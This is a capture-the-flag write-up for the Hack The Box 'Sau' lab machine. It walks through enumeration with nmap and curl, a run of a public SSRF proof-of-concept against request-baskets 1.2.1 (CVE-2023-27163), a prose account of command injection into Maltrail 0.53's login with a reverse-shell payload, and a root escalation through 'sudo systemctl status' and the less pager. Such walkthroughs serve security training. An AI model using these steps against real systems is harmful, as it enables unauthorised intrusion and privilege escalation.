---
slug: /write-up/htb/easy/sau
pagination_next: null
pagination_prev: null
draft: true
---

## Enumeration

Initial scan shows some open ports:

```bash
└──╼ $nmap sau.htb -oA scans/initial_scan -Pn -n
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:10 BST
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.14s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 20.00 seconds
```

Port 80 is behind a firewall.

SSH:
```bash
└──╼ $nmap sau.htb -oA scans/ssh_scan -Pn -n -p22 -sC -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:11 BST
Nmap scan report for sau.htb (10.10.11.224)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
```

We are dealing with an ubuntu focal.

55555:
The nmap is taking a lot of time in determining the service. However, if we `curl` the port, we can see that it's a webserver:

```bash
└──╼ $curl -vvv sau.htb:55555
*   Trying 10.10.11.224:55555...
* Connected to sau.htb (10.10.11.224) port 55555 (#0)
> GET / HTTP/1.1
> Host: sau.htb:55555
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 302 Found
< Content-Type: text/html; charset=utf-8
< Location: /web
< Date: Wed, 27 Sep 2023 18:17:35 GMT
< Content-Length: 27
< 
<a href="/web">Found</a>.
```

The result from nmap came back and say that it cannot determine the service. We can see that if has something to do with baskets:

```
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
```

If we curl the home page, we can see something interesting:
```html
        <small>
          Powered by <a href="https://github.com/darklynx/request-baskets">request-baskets</a> |
          Version: 1.2.1
        </small>
```

Checking the website source code from the browser, we can see that there's a basket API which used a "Master token" for auth.

```js
        $.ajax({
          method: "POST",
          url: "/api/baskets/" + basket,
          headers: {
            "Authorization" : sessionStorage.getItem("master_token")
          }
```

After reading a bit, looks like the service is a server used to display HTTP requests

## Foothold

Knowing the service and version, we can search for CVEs. 

https://github.com/entr0pie/CVE-2023-27163

Looks like we can abuse of the request-baskets to access the webserver listening on port 80 but firewalled and...it's working:

```bash
┌─[parrot@parrot]─[~/workspace/gal/htb/machines/sau/exploits]
└──╼ $./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1
Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163

> Creating the "zfqies" proxy basket...
> Basket created!
> Accessing http://sau.htb:55555/zfqies now makes the server request to http://127.0.0.1.
> Authorization: sXxaCFrbUXtDv3qiltNRTbGju6JosLVH8fL2DkqyeiN9
```

```bash
└──╼ $curl -vvv http://sau.htb:55555/zfqies
*   Trying 10.10.11.224:55555...
* Connected to sau.htb (10.10.11.224) port 55555 (#0)
> GET /zfqies HTTP/1.1
> Host: sau.htb:55555
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Cache-Control: no-cache
< Connection: close
< Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
< Content-Type: text/html
< Date: Thu, 28 Sep 2023 09:29:31 GMT
< Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT
< Server: Maltrail/0.53
< Transfer-Encoding: chunked
< 
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html;charset=utf8">
        <meta name="viewport" content="width=device-width, user-scalable=no">
        <meta name="robots" content="noindex, nofollow">
```

In the firewalled webserver there's an instance of maltrail 0.53 service, which making a quick google search has a OS command injection vulnerability in the username field of the /login endpoint. There's even a metasploit module to explot it. See: https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html

I've made some attempts with the bash and sh payloads from reverse shell and base64 encoded, also play around with data encoding (url encode, form encode, ...)

Finally I've made it work by using a python payload, base64 and form encoding.

We can read the user flag


## Privilege escalation

`sudo -l` shows that the user can execute systemctl status as any user (including root):

```
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Let's search how to explot that in GTFO bins, looks like the default pager for systemctl is `less`, we can have access to root by just typing: `!sh` and voila!

We can read root flag.